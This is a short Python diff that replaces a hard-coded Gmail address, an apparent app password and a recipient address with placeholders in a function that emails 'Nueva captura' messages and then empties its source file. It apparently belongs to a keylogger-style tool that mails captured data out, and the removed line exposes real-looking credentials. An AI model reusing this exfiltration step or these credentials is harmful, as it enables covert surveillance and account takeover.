@@ -27,7 +27,7 @@ def EnviarEmail():
             print(mensaje)
             
             # Enviar correo
-            crearEmail('cristianmirandapadilla003@gmail.com', 'floj ixcr dutv ajkh', 'micristian53@gmail.com', f'Nueva captura: {fecha}', mensaje)
+            crearEmail('correo1@gmail.com', 'contraseña_app', 'correo2@gmail.com', f'Nueva captura: {fecha}', mensaje)
             
             f.seek(0)
             f.truncate()
